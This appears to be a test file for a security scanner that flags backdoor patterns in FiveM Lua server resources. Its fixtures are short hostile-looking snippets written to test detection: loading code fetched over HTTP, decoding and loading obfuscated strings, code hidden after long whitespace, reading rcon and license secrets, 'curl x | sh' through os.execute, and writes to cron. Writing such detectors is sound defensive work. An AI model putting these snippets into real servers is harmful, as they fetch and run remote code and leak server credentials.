// Fixtures describe backdoor *shapes* (remote loader, encoded strings, secret reads); none of them is real malware.
import assert from "node:assert/strict";
import { test } from "node:test";
import { securityRules } from "../src/rules.js";

const findings = (server, code) => securityRules("server.lua", server).findings.filter((f) => f.code === code);
const fires = (server, code) => findings(server, code).length > 0;
const escaped = (text) => [...text].map((c) => `\\x${c.charCodeAt(0).toString(16).padStart(2, "0")}`).join("");

test("LAB-SEC-101: load of an HTTP response, not load of resource files", () => {
  const [f] = findings("PerformHttpRequest('https://example.com/x', function(_, body) assert(load(body))() end)", "LAB-SEC-101");
  assert.deepEqual([f.severity, f.path, f.line], ["warning", "server.lua", 1]);
  assert.ok(fires("PerformHttpRequest(url, function(e, d, h) pcall(function() assert(load(d))() end) end)", "LAB-SEC-101"));
  assert.ok(fires("PerformHttpRequest(url, function(e, d) local fn = loadstring(d) fn() end, 'GET')", "LAB-SEC-101"));
  assert.ok(!fires("local chunk = load(LoadResourceFile(GetCurrentResourceName(), 'data.lua'))", "LAB-SEC-101"));
  assert.ok(!fires("PerformHttpRequest(webhook, function(code) print(code) end, 'POST', json.encode({ content = 'log' }))", "LAB-SEC-101"));
});

test("LAB-SEC-102: load of decoded text, not of plain variables", () => {
  assert.ok(fires("load(string.char(112, 114, 105, 110, 116))()", "LAB-SEC-102"));
  assert.ok(fires(`load("${escaped("print('hi')")}")()`, "LAB-SEC-102"));
  assert.ok(fires("assert(load(base64decode(payload)))()", "LAB-SEC-102"));
  assert.ok(!fires("local fn = load(code, '@chunk', 't', env)", "LAB-SEC-102"));
  assert.ok(!fires("load('return 1 + 1')()", "LAB-SEC-102"));
});

test("LAB-SEC-107: code after a long run of spaces is an error, a comment there is not", () => {
  const [f] = findings(`print('ok')\n${" ".repeat(7168)}local a=load(x) if a then a() end\nprint('after')`, "LAB-SEC-107");
  assert.deepEqual([f.severity, f.line], ["error", 2]);
  assert.ok(!fires(`print('ok')${" ".repeat(500)}-- note`, "LAB-SEC-107"));
  assert.ok(!fires(`local s = "${" ".repeat(399)}x"`, "LAB-SEC-107"));
  assert.deepEqual(findings(`a()${" ".repeat(500)}-- note\nb()\n${"\t".repeat(450)}load(x)()`, "LAB-SEC-107").map((x) => x.line), [3]);
  assert.ok(securityRules("ui/app.js", `x()${" ".repeat(600)}fetch(u)`).findings.some((x) => x.code === "LAB-SEC-107"));
});

test("LAB-SEC-107: a huge run of spaces is checked in linear time", () => {
  const start = performance.now();
  for (const blank of [" ", "\v", "\f", "\t"]) securityRules("x.js", `a${blank.repeat(2_000_000)}`);
  assert.ok(performance.now() - start < 2_000);
});

test("LAB-SEC-103: long encoded data, not short escapes or images", () => {
  assert.ok(fires(`local s = "${escaped("x".repeat(50))}"`, "LAB-SEC-103"));
  assert.ok(fires(`local s = "${"QUJD".repeat(120)}"`, "LAB-SEC-103"));
  assert.ok(fires(`local s = string.char(${Array.from({ length: 25 }, () => 65).join(", ")})`, "LAB-SEC-103"));
  assert.ok(!fires('print("line one\\nline two\\t\\x41")', "LAB-SEC-103"));
  assert.ok(!fires(`local img = "data:image/png;base64,${"QUJD".repeat(200)}"`, "LAB-SEC-103"));
  assert.ok(!fires("local sep = string.char(10)", "LAB-SEC-103"));
});

test("LAB-SEC-104: secret convars; the database string only next to HTTP", () => {
  assert.ok(fires("local key = GetConvar('sv_licenseKey', '')", "LAB-SEC-104"));
  assert.ok(fires("local pw = GetConvar('rcon_password', '')", "LAB-SEC-104"));
  assert.ok(fires("local db = GetConvar('mysql_connection_string', '')\nPerformHttpRequest(u, function() end, 'POST', db)", "LAB-SEC-104"));
  assert.ok(!fires("local db = GetConvar('mysql_connection_string', '')", "LAB-SEC-104"));
  assert.ok(!fires("local locale = GetConvar('ox:locale', 'en')", "LAB-SEC-104"));
});

test("LAB-SEC-105: raw public IPs and hidden URLs, not named hosts or local services", () => {
  assert.ok(fires("PerformHttpRequest('http://45.13.12.9:8080/p', function() end)", "LAB-SEC-105"));
  assert.ok(fires("local u = 'https://203.0.113.7/x'\nPerformHttpRequest(u, function() end)", "LAB-SEC-105"));
  assert.ok(fires(`PerformHttpRequest("${escaped("https://example.com/")}", function() end)`, "LAB-SEC-105"));
  assert.ok(!fires("PerformHttpRequest('https://discord.com/api/webhooks/1/abc', function() end, 'POST')", "LAB-SEC-105"));
  assert.ok(!fires("PerformHttpRequest('http://127.0.0.1:3000/hook', function() end)", "LAB-SEC-105"));
  assert.ok(!fires("local ip = 'http://45.13.12.9/'", "LAB-SEC-105"));
});

test("LAB-SEC-106: shell, writes outside the resource, spreading into computed resources", () => {
  assert.ok(fires("os.execute('curl x | sh')", "LAB-SEC-106"));
  assert.ok(fires("local p = io.popen('whoami')", "LAB-SEC-106"));
  assert.ok(fires("local f = io.open('/etc/cron.d/x', 'w')", "LAB-SEC-106"));
  assert.ok(fires("for i = 0, GetNumResources() - 1 do\n  local r = GetResourceByFindIndex(i)\n  SaveResourceFile(r, 'fxmanifest.lua', data, -1)\nend", "LAB-SEC-106"));
  assert.ok(!fires("local f = io.open(GetResourcePath(GetCurrentResourceName()) .. '/logs.txt', 'a')", "LAB-SEC-106"));
  assert.ok(!fires("local f = io.open(path, 'r')", "LAB-SEC-106"));
  assert.ok(!fires("local res = GetCurrentResourceName()\nSaveResourceFile(res, 'data.json', json.encode(t), -1)", "LAB-SEC-106"));
  assert.ok(!fires("SaveResourceFile('ox_doorlock', 'convert/x.lua', text, -1)", "LAB-SEC-106"));
  assert.ok(!fires("local cmd = 'ls \"'\nlocal dir = io.popen(cmd .. path .. '\"')", "LAB-SEC-106"));
});

test("LAB-SEC-108: a real-shaped credential, never echoed, not a placeholder", () => {
  const token = ["MTAy" + "x".repeat(20), "AbCdEf", "y".repeat(38)].join(".");
  const [f] = findings(`bot_Token = "${token}"`, "LAB-SEC-108");
  assert.equal(f.line, 1);
  assert.ok(!f.message.includes(token));
  assert.ok(fires(`local hook = "https://discord.com/api/webhooks/123456789012345678/${"z".repeat(68)}"`, "LAB-SEC-108"));
  assert.ok(!fires('bot_Token = "" -- your own token', "LAB-SEC-108"));
  assert.ok(!fires('Config.Webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK"', "LAB-SEC-108"));
});

test("CfxLua syntax parses; broken Lua still gets the text checks", () => {
  assert.equal(securityRules("a.lua", "local x <const> = 1\nx += 1\nlocal y = a?.b\nlocal h = `hash`").parsed, true);
  const broken = securityRules("b.lua", `if then${" ".repeat(500)}load(x)()`);
  assert.equal(broken.parsed, false);
  assert.ok(broken.findings.some((x) => x.code === "LAB-SEC-107"));
});
